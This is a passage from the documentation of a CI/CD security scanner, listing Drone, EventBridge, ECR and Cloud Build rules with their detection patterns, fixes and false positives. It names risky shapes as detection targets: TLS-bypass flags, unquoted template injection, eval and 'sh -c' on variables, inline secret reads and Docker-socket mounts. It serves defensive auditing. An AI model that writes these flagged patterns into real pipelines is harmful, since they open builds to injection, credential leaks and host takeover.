**Recommendation.** Treat user-controllable Drone template variables as tainted. Drone substitutes ``${DRONE_*}`` tokens *before* the shell parses the command, so an unquoted use is a textbook command-injection primitive. The safe pattern is to copy the value into the step's ``environment:`` block (``MSG: ${DRONE_PULL_REQUEST_TITLE}``) and reference the env var quoted in the command (``echo "$MSG"``). Drone's own docs call out the same hardening for build-message / commit-author fields.

**Known false positives.**

- Trusted-only Drone variables (``DRONE_BUILD_NUMBER``, ``DRONE_BUILD_STATUS``, ``DRONE_REPO_NAMESPACE`` for non-fork repos) aren't user-controllable and are safe to interpolate unquoted. Drone-template syntax can also appear in YAML strings outside ``commands:``; this rule only scopes itself to step command bodies, so an unquoted use in (say) ``settings.message:`` doesn't fire here, those land under DR-004 / SBOM-style audits.

**Source:** [`DR-003`](../providers/drone.md#dr-003) in the [Drone CI provider](../providers/drone.md).

### `DR-004`: Literal credential in step environment / settings <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-dr-004 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** The rule fires on credential-shaped values where the key name suggests a secret (``token``, ``password``, ``secret``, ``key``, ``apikey``, ``api_key``, ``access_key``, ``private_key``, ``auth``, ``credentials``) and the value is a plain string rather than a ``{from_secret: NAME}`` reference. AWS-style ``AKIA...`` keys also fire regardless of the key name (matching the AWS canonical access-key shape). Empty strings and the explicit literal ``null`` are not flagged: an empty value is a configuration bug, not a leaked credential. Same model as BK-002 / TKN-005 / ARGO-006 in this catalog.

**Recommendation.** Move every literal credential into a Drone secret (``drone secret add --repository OWNER/REPO --name MY_SECRET --value ...``) and reference it via the ``from_secret:`` mechanism: ``MY_SECRET: { from_secret: MY_SECRET }``. The same applies to plugin ``settings:`` blocks. Drone redacts ``from_secret`` values from log output but does NOT redact literals, so a pasted token in source ends up in the build log indefinitely.

**Known false positives.**

- Configuration values that happen to use a credential-shaped key name but never carry a secret (``DOCKER_CONFIG=/dev/null`` to suppress credential loading) sometimes trip this rule. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape; the broader credential-vocab match still catches real leaks elsewhere in the pipeline.

**Source:** [`DR-004`](../providers/drone.md#dr-004) in the [Drone CI provider](../providers/drone.md).

### `DR-005`: Plugin step uses a floating image tag <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-005 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Drone treats a step as a plugin when it has a ``settings:`` block. The ``image:`` field still names the container that runs, and the same supply-chain argument as DR-001 applies; this rule fires specifically on plugin steps using a floating tag (``:latest``, no tag, or a non-version-shaped tag) rather than every unpinned image, so a maintainer weighing trade-offs can ratchet plugin pinning up first. A pinned-version tag (``plugins/docker:20.13.0``) passes this rule but still trips DR-001 for the wider supply-chain hardening.

**Recommendation.** Pin every plugin step's ``image:`` to ``@sha256:<digest>`` or, at minimum, a specific version tag (``plugins/docker:20.13.0`` rather than ``plugins/docker:latest`` or ``plugins/docker``). Plugin steps are a sharper attack surface than ordinary steps because Drone passes every ``settings:`` key to the plugin as an environment variable, including any secret references; a malicious plugin replacement can exfiltrate the entire credential set the step was trusted with.

**Known false positives.**

- Internal-registry plugins built and pushed by the same pipeline (``image: my-org/internal-plugin:dev`` produced upstream) sometimes can't be exact-pinned. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape.

**Source:** [`DR-005`](../providers/drone.md#dr-005) in the [Drone CI provider](../providers/drone.md).

### `DR-006`: TLS verification disabled in step commands <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-006 }

**Evidences:** [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Uses the cross-provider ``_primitives.tls_bypass`` detector shared with GHA-027, BK-008, JF-022, ADO-026, CC-024, GCB-011, and the CFN / Terraform rule packs. Covers curl / wget / git / npm / yarn / pip / helm / kubectl / ssh / docker / maven / gradle / aws bypasses. The rule scans every ``commands:`` entry on every step.

**Recommendation.** Remove TLS-bypass flags from build commands. The most common offenders are ``curl --insecure`` / ``-k`` / ``wget --no-check-certificate``, ``pip config set global.trusted-host``, ``npm config set strict-ssl false``, and ``git -c http.sslverify=false``. Each exposes the build to TLS-MITM injection of a registry-served payload, which is a textbook supply-chain attack vector. If a registry's certificate is genuinely broken, fix the registry rather than permanently disabling verification, the bypass tends to outlive the broken cert and become a permanent weakness.

**Source:** [`DR-006`](../providers/drone.md#dr-006) in the [Drone CI provider](../providers/drone.md).

### `DR-007`: Step mounts a sensitive host path <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-007 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers), [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Drone's pipeline-level ``volumes:`` block accepts either ``temp:`` (an ephemeral tmpfs, safe) or ``host: { path: ... }`` (a bind mount of the agent's filesystem, the dangerous shape). The rule fires when any pipeline-level volume's ``host.path`` matches a sensitive prefix:

- ``/var/run/docker.sock`` — the canonical Docker-in-Docker escape; equivalent to ``--privileged`` for container takeover purposes;
- ``/var/lib/docker`` — exposes every image / container on the host;
- ``/etc`` — config + credential files;
- ``/proc`` / ``/sys`` — host kernel state;
- ``/`` — full host takeover.

The rule fires on the volume *declaration*, not on step-level mounts. A pipeline that declares a sensitive host volume but no step actually mounts it is still flagged: the declaration alone signals the agent's Drone runner is configured to permit the bind mount, which is itself a risk-shape decision worth review.

**Recommendation.** Drop the host volume from the pipeline. Mounting ``/var/run/docker.sock`` from the agent host into a build container hands the container root-equivalent control over every other workload on the same agent (it can spawn arbitrary containers, including privileged ones). ``/var/lib/docker`` exposes every image and container on the host, ``/proc`` and ``/sys`` expose the host kernel state, and ``/`` (the host root) is full takeover. If the build genuinely needs Docker, run a rootless alternative (``kaniko``, ``buildah --isolation=chroot``, ``docker buildx`` against a remote builder) or use Drone's ``trusted: true`` repo flag plus a dedicated host-isolated runner pool, rather than mounting the shared host's socket.

**Known false positives.**

- Trusted-only pipelines on a dedicated runner fleet (no fork-PR access, no untrusted contributors) sometimes deliberately mount the Docker socket for image build / push workflows. Suppress via ignore-file when this is the deliberate posture and the runner pool's isolation is documented elsewhere; the rule has no way to know whether ``trusted: true`` is set on the repo from the pipeline YAML alone.

**Source:** [`DR-007`](../providers/drone.md#dr-007) in the [Drone CI provider](../providers/drone.md).

### `DR-008`: Step uses ``pull: never`` (skips registry verification) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-dr-008 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Drone supports three ``pull:`` policies on a step: ``always`` (re-fetch + verify on every build, the default), ``if-not-exists`` (use cache when present, otherwise pull), and ``never`` (use cache only). The ``never`` policy is the dangerous one because it skips the digest verification an ``always`` pull would perform, and there's no out-of-band signal that the cached image is the one the manifest names. The rule fires on either steps or services declaring ``pull: never``. ``pull: if-not-exists`` is treated as acceptable: it's tolerable when paired with a digest-pinned ``image:`` (DR-001) and a deliberate operational decision; the explicit-skip case (``never``) is what TAINT-class supply-chain attacks lean on.

**Recommendation.** Drop the ``pull: never`` directive (or change it to ``pull: always`` / ``pull: if-not-exists``). ``pull: never`` tells the Drone agent to skip the registry round-trip entirely, so the agent runs whatever image bytes it cached on a previous build without re-verifying the digest. If a compromised image ever landed in the agent's local cache (a poisoned registry tag, a manual ``docker pull`` during a debug session, a co-resident workload that pulled a malicious image), the cached bytes keep running until an operator manually clears the cache. ``pull: always`` (the Drone default) re-fetches and verifies on every build; ``pull: if-not-exists`` is acceptable when the image is digest-pinned (DR-001) so the cache key is content-addressed.

**Known false positives.**

- Air-gapped or registry-pinned environments sometimes set ``pull: never`` deliberately because the agent never has registry access in the first place. Suppress via ignore-file when this is the deliberate shape; the runner's network isolation then carries the integrity guarantee instead of the registry round-trip.

**Source:** [`DR-008`](../providers/drone.md#dr-008) in the [Drone CI provider](../providers/drone.md).

### `DR-009`: Cache plugin key embeds an attacker-controllable Drone variable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-009 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Drone has no first-party cache keyword; pipelines use plugin steps (``drone-cache``, ``drone-volume-cache``, ``drone-s3-cache``, etc.) configured via ``settings:``. The rule fires on any plugin step whose ``settings.cache_key`` (or related ``key``, ``mount``, ``filename``, ``restore_keys``) interpolates a tainted Drone variable. Tainted vocabulary mirrors DR-003: ``$DRONE_BRANCH``, ``$DRONE_PULL_REQUEST*``, ``$DRONE_COMMIT_*MESSAGE``, ``$DRONE_TAG_MESSAGE``, and the fork-PR-shaped ``$DRONE_REPO_*`` family. The attack model is well-documented (GHA-011 catches the same shape on the GitHub Actions side).

**Recommendation.** Don't embed PR-controlled or branch-controlled Drone variables in cache keys. The canonical safe shape is to key on commit-stable inputs only: a checksum of the lockfile (``${DRONE_REPO_BRANCH}-${DRONE_COMMIT_SHA}`` is unique enough; ``${DRONE_BRANCH}`` alone is attacker-controllable). When two builds need to share a cache, key on the dependency manifest's hash, not on any branch / PR / repo metadata that a fork PR can shape. If a fork PR's cache write can ever be read back by a trusted-context build (the same key on a different branch), the attacker can inject malicious build artifacts into the trusted run.

**Known false positives.**

- Plugins that namespace cache reads by branch on the *write* side and never read across branches (a deliberate cache partitioning) are technically safe, the attacker can poison their own branch's cache but can't reach the trusted-branch one. The rule has no way to verify partition boundaries at scan time; suppress via ignore-file scoped to the specific step name when the partitioning is audited.

**Source:** [`DR-009`](../providers/drone.md#dr-009) in the [Drone CI provider](../providers/drone.md).

### `DR-010`: Step commands run unpinned package installs <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-dr-010 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Detection reuses the cross-provider primitives ``PKG_INSECURE_RE`` and ``PKG_NO_LOCKFILE_RE`` from ``checks/base.py``. The same rule pack already exists for GHA (``GHA-021`` / ``GHA-022``), GitLab (``GL-021`` / ``GL-022``), Bitbucket / Azure DevOps / Jenkins / CircleCI / Cloud Build / Buildkite / Tekton / Argo. Drone was the missing port; this closes the gap.

Insecure variants matched (``PKG_INSECURE_RE``): ``pip --index-url http://``, ``pip --trusted-host``, ``npm --registry http://``, ``gem --source http://``, ``nuget --Source http://``, ``cargo --index http://``. Lockfile-bypass variants (``PKG_NO_LOCKFILE_RE``): ``npm install`` (should be ``npm ci``), bare ``pip install <pkg>`` without ``-r`` or ``--require-hashes``, ``yarn install`` without ``--frozen-lockfile``, ``bundle install`` without ``--frozen``, ``cargo install``, ``go install`` without an ``@vN.N`` pin, ``poetry install`` without ``--no-update``.

**Recommendation.** Pin every package install to a lockfile or a checksum-verified version. For pip, use ``pip install --require-hashes -r requirements.txt`` or ``-r requirements.txt`` with hashes baked into the lock; ``pip install <package>`` without a version pin or lockfile flag is the unsafe shape. For npm, prefer ``npm ci`` over ``npm install`` so the lockfile is load-bearing. Yarn: ``yarn install --frozen-lockfile``. Bundle: ``bundle install --frozen``. Cargo / go install: always pin to a tag or commit. Do NOT use ``--trusted-host`` / ``--no-verify`` / a non-HTTPS index URL — those bypass TLS or trust validation entirely (DR-006 covers the TLS subset; this rule covers the lockfile subset).

**Known false positives.**

- Bootstrap-stage installs that intentionally pull latest (``apt-get install -y curl`` for a tooling image rebuild) sometimes legitimately bypass the lockfile. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape; the broader pinning policy still covers the rest of the pipeline.

**Source:** [`DR-010`](../providers/drone.md#dr-010) in the [Drone CI provider](../providers/drone.md).

### `DR-011`: node map interpolates attacker-controllable Drone variable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-011 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Drone substitutes ``${VAR}`` template tokens against the build context before the runner picks an agent. The rule walks the pipeline-level ``node:`` map (Drone doesn't expose a per-step variant) for any reference to the same author-controllable variables DR-003 tracks (``DRONE_BRANCH``, ``DRONE_TAG``, ``DRONE_PULL_REQUEST_*``, ``DRONE_COMMIT_AUTHOR*``, ``DRONE_COMMIT_MESSAGE``, ``DRONE_REPO``).

Detection is value-only and case-sensitive against the documented variable names; trusted server-controlled fields like ``DRONE_BUILD_NUMBER`` and ``DRONE_REPO_NAMESPACE`` (for non-fork repos) aren't on the tainted list. Closes parity with BK-015 / GHA-036 / GL-032 / JF-032 / ADO-030 / CC-031.

**Recommendation.** Pin every ``node:`` map entry to a static literal that matches your runner-targeting policy. Drone uses ``node:`` to route a pipeline to runners with matching labels (e.g. ``node: { instance: ci-prod-amd64 }``). When the map value interpolates ``${DRONE_BRANCH}`` / ``${DRONE_PULL_REQUEST_*}`` / ``${DRONE_COMMIT_AUTHOR}``, the pusher gets to pick which runner pool runs the pipeline, including a privileged pool reserved for the deploy step. Production runner pools should also carry a label the agent itself enforces (the runner's ``DRONE_RUNNER_LABELS`` env var, plus a server-side policy on which repos can target which labels) so the rule is one layer of defense-in-depth.

**Known false positives.**

- Some teams use a static prefix plus a CI-controlled tail (``node: { pool: build-${DRONE_REPO_NAME} }``) to share a runner pool across repos. ``DRONE_REPO_NAME`` is set by the server, not the pusher, so it isn't on the tainted list, but if your team has its own conventions for trusted Drone vars, suppress on the specific pipeline name.

**Source:** [`DR-011`](../providers/drone.md#dr-011) in the [Drone CI provider](../providers/drone.md).

### `EB-000`: EventBridge API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-eb-000 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** See [`AWS` provider documentation](../providers/aws.md) for the rule's detection mechanism.

**Recommendation.** See [`AWS` provider documentation](../providers/aws.md) for the recommended remediation.

**Source:** [`EB-000`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `EB-001`: No EventBridge rule for CodePipeline failure notifications <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-eb-001 }

**Evidences:** [`ESF-C-DEPLOY-MON`](#ctrl-esf-c-deploy-mon) Monitor deployments with alarms / health checks.

**How this is detected.** Pipeline failure events are emitted to EventBridge automatically; the missing piece is a rule that pipes them to somewhere a human reads (SNS, Slack, PagerDuty). Without it, failures only surface via the CodePipeline console, which no one watches.

**Recommendation.** Create an EventBridge rule matching ``detail-type: 'CodePipeline Pipeline Execution State Change'`` and ``state: FAILED``, and point it at an SNS topic or chat webhook. Without it, pipeline failures during an incident (a compromise triggering rollback, for example) go unnoticed.

**Source:** [`EB-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `EB-002`: EventBridge rule has a wildcard target ARN <span class="pg-sev pg-sev--high">HIGH</span> { #detail-eb-002 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** Wildcard target ARNs (e.g. ``arn:aws:lambda:us-east-1:123456789012:function:*``) match every resource that fits the prefix. This is rarely intentional, usually a copy-paste from a more permissive resource ARN, and means the rule fans out to a much larger set of consumers than the author meant.

**Recommendation.** Replace wildcard target ARNs with specific resource ARNs. EventBridge targets with ``*`` route events to any resource that matches the prefix, frequently triggering unintended Lambda invocations or SNS sends.

**Source:** [`EB-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `ECR-000`: ECR API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-ecr-000 }

**Evidences:** [`ESF-C-AUDIT`](#ctrl-esf-c-audit) Audit deployment / pipeline activity and retain logs.

**How this is detected.** See [`AWS` provider documentation](../providers/aws.md) for the rule's detection mechanism.

**Recommendation.** See [`AWS` provider documentation](../providers/aws.md) for the recommended remediation.

**Source:** [`ECR-000`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `ECR-001`: Image scanning on push not enabled <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ecr-001 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** scan-on-push runs a CVE check against the image's OS package layers at the moment it lands in ECR. Without it, an image with a known CVE deploys silently. The ECR basic scanner is free; ECR-007 covers the Inspector v2 enhanced scanner that adds language-ecosystem CVEs (npm, pip, gem).

**Recommendation.** Enable imageScanningConfiguration.scanOnPush on the repository. Consider also enabling Amazon Inspector continuous scanning for ongoing CVE detection against images already in the registry.

**Source:** [`ECR-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `ECR-002`: Image tags are mutable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ecr-002 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build, [`ESF-S-IMMUTABLE`](#ctrl-esf-s-immutable) Enforce artifact / tag immutability to preserve provenance, [`ESF-C-ROLLBACK`](#ctrl-esf-c-rollback) Automated rollback on deployment failure or alarm.

**How this is detected.** Mutable tags mean ``:latest``, ``:v1.0``, and ``:stable`` can be re-pushed silently, the same tag points to different image content over time. Pinning by digest (``sha256:...``) in deployment manifests is the only durable reference; IMMUTABLE on the repo enforces the property registry-side so a forgotten digest reference doesn't drift.

**Recommendation.** Set imageTagMutability=IMMUTABLE on the repository. Reference images by digest (sha256:...) in deployment manifests for strongest immutability guarantees.

**Source:** [`ECR-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `ECR-003`: Repository policy allows public access <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ecr-003 }

**Evidences:** [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries, [`ESF-C-ARTIFACT-AUTHZ`](#ctrl-esf-c-artifact-authz) Restrict access to artifact storage and deployment pipelines.

**How this is detected.** A wildcard-principal repo policy means anyone on the internet can pull images. Sometimes intentional (a publicly-distributed base image), but should be a deliberate exposure, typically via the ECR Public registry rather than a private repo with a public policy. The default for build-output images should never be public.

**Recommendation.** Remove wildcard principals from the repository policy. Grant access only to specific AWS account IDs or IAM principals that require it.

**Source:** [`ECR-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `ECR-004`: No lifecycle policy configured <span class="pg-sev pg-sev--low">LOW</span> { #detail-ecr-004 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Without a lifecycle policy, untagged images and old tagged images accumulate indefinitely. Stale images keep CVE attack surface available, anyone who can pull from the repo can pull the old, unpatched version even after a newer build has shipped. Lifecycle expiry is the housekeeper that closes that window.

**Recommendation.** Add a lifecycle policy that expires untagged images after a short period (e.g. 7 days) and limits the number of tagged images retained, reducing exposure to images with known CVEs.

**Source:** [`ECR-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `ECR-005`: Repository encrypted with AES256 rather than KMS CMK <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ecr-005 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release.

**How this is detected.** Same shape as CP-002 / CWL-002 / CCM-002: AES256 (the AWS-managed default) gives confidentiality at rest but no key-policy or CloudTrail Decrypt-event story. Container images are arguably sensitive intellectual property, the same key-policy + audit shape as build outputs in S3 is warranted.

**Recommendation.** Set encryptionType=KMS with a customer-managed key ARN.

**Source:** [`ECR-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `ECR-006`: ECR pull-through cache rule uses an untrusted upstream <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ecr-006 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** AWS supports pull-through cache for ECR Public, Quay, K8s, GitHub Container Registry, GitLab, and Docker Hub. A rule pointing at ``registry-1.docker.io`` without an authenticated credential silently caches whatever the public namespace resolves to.

**Recommendation.** Scope pull-through cache rules to AWS-trusted registries (ECR Public, Quay.io with authentication, or a vetted private registry). Avoid wildcard or unauthenticated upstreams, a malicious image there gets cached into your account registry on first pull.

**Source:** [`ECR-006`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `ECR-007`: Inspector v2 enhanced scanning disabled for ECR <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ecr-007 }

**Evidences:** [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** ECR-001's basic on-push scan covers OS-level packages, apt / yum / apk lineage. Most production CVE risk is in language ecosystems (npm, pip, gem, mvn) which the basic scanner ignores. Inspector v2 enhanced scanning closes that gap and runs continuously, so a CVE published two weeks after a build still surfaces against the deployed image.

**Recommendation.** Enable Amazon Inspector v2 for the ``ECR`` scan type on this account. Basic ECR scanning on-push only covers OS packages; Inspector v2 enhanced scanning adds language-ecosystem CVEs and runs continuously as new vulnerabilities are published.

**Source:** [`ECR-007`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

### `GCB-001`: Cloud Build step image not pinned by digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-001 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Bare references (``gcr.io/cloud-builders/docker``) are treated as ``:latest`` by Cloud Build. Tag-only references (``:20``, ``:latest``) count as unpinned. Only ``@sha256:…`` suffixes pass.

**Recommendation.** Pin every ``steps[].name`` image to an ``@sha256:<digest>`` suffix. ``gcr.io/cloud-builders/docker:latest`` is mutable; Google publishes new builder images frequently and the next build would pull whatever is current. Resolve the digest with ``gcloud artifacts docker images describe <ref> --format='value(image_summary.digest)'`` and pin it.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GCB-001`](../providers/cloudbuild.md#gcb-001) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-002`: Cloud Build uses the default service account <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-002 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** The default Cloud Build service account historically held ``roles/cloudbuild.builds.builder`` plus project-level editor in many organisations. Even under the GCP April-2024 default-identity change, the default SA is still broader than what a single pipeline needs. Explicit ``serviceAccount:`` is required to pass.

**Recommendation.** Create a dedicated service account for the build, grant it only the roles the pipeline actually needs (``roles/artifactregistry.writer``, ``roles/storage.objectCreator`` for artifact upload, etc.), and set ``serviceAccount: projects/<PROJECT>/serviceAccounts/<NAME>@...``. Leaving it unset falls back to the default Cloud Build SA, which accumulates roles over a project's lifetime and is routinely granted ``roles/editor``.

**Source:** [`GCB-002`](../providers/cloudbuild.md#gcb-002) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-003`: Secret Manager value referenced in step args <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-003 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Detection patterns: literal ``projects/<n>/secrets/<name>/versions/...`` URIs, ``gcloud secrets versions access`` shell invocations, and ``$(gcloud secrets …)`` command substitutions in step args or entrypoint.

**Recommendation.** Map the secret under ``availableSecrets.secretManager[]`` with an ``env:`` alias, then reference it from each step via ``secretEnv: [ALIAS]``. Avoid inline ``gcloud secrets versions access`` in ``args``, the resolved plaintext lands in build logs.

**Known false positives.**

- Steps whose sole purpose is to *grant* a service account access to a secret (``gcloud secrets add-iam-policy-binding``) reference the resource URI without exposing the value. The literal-URI regex doesn't distinguish read from administrative operations. Suppress those specific steps via ``--ignore-file`` once you've confirmed the gcloud subcommand is administrative.

**Source:** [`GCB-003`](../providers/cloudbuild.md#gcb-003) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-004`: dynamicSubstitutions on with user substitutions in step args <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-004 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** The ``_``-prefix is Cloud Build's naming convention for user substitutions; they are editable via build trigger UI, ``gcloud builds submit --substitutions``, and the REST API. Built-in substitutions (``$PROJECT_ID``, ``$COMMIT_SHA``, ``$BUILD_ID``) are derived from the trigger event and are *not* treated as user-controlled by this rule.

**Recommendation.** Either disable ``options.dynamicSubstitutions`` (it defaults to false) or move user substitutions (``$_FOO``) out of step ``args``, pass them through ``env:`` and reference them inside a shell script the builder runs. Dynamic substitution re-evaluates bash syntax after variable expansion, giving trigger-config editors a script-injection channel.

**Known false positives.**

- Pipelines that enable ``dynamicSubstitutions`` solely to use bash parameter expansion on *built-in* substitutions (``${PROJECT_ID/-/_}``) still flag if any step also references a ``$_USER_VAR``, even when the user sub lands in a context that can't reach a shell. The rule has no AST-level awareness of which substitution is consumed by which shell context. Suppress per-step via ``--ignore-file`` after verifying the user sub never feeds bash re-evaluation.

**Source:** [`GCB-004`](../providers/cloudbuild.md#gcb-004) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-005`: Build timeout unset or excessive <span class="pg-sev pg-sev--low">LOW</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-005 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Cloud Build's default 10-minute timeout applies silently when ``timeout:`` is absent. Accepted format is ``<N>s`` (seconds); ``<N>m``/``<N>h`` forms are a gcloud convenience and are treated as malformed by the API.

**Recommendation.** Declare an explicit ``timeout:`` at the top of ``cloudbuild.yaml`` bounded to the build's realistic worst case (e.g. ``1800s`` for most container builds). Explicit bounds shorten the window a compromised build can spend on a shared worker and flag regressions when a legitimate step slows down.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GCB-005`](../providers/cloudbuild.md#gcb-005) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-006`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-006 }

**Evidences:** [`ESF-D-BUILD-LOGS`](#ctrl-esf-d-build-logs) Generate and preserve build audit logs.

**How this is detected.** Complements GCB-004 (dynamicSubstitutions + user substitution in args). GCB-006 fires on intrinsically risky shell idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the substitution source is currently trusted.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate or allow-list any value that must feed a dynamic command at the boundary. In Cloud Build these idioms typically appear in ``args: [-c, ...]`` entries under a bash entrypoint.

**Known false positives.**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`GCB-006`](../providers/cloudbuild.md#gcb-006) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-007`: availableSecrets references ``versions/latest`` <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-007 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** ``versions/latest`` is documented as a rolling alias. A build run on Monday and a re-run on Tuesday can consume different secret bodies without any change to ``cloudbuild.yaml``, breaking the reproducibility invariant that pinning protects.

**Recommendation.** Pin each ``availableSecrets.secretManager[].versionName`` to a specific version number (``.../versions/7``) rather than ``latest``. Rotate by updating the number when a new version is promoted, not by silently publishing a new version that the next build pulls.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GCB-007`](../providers/cloudbuild.md#gcb-007) in the [Cloud Build provider](../providers/cloudbuild.md).

### `GCB-008`: No vulnerability scanning step in Cloud Build pipeline <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gcb-008 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release.

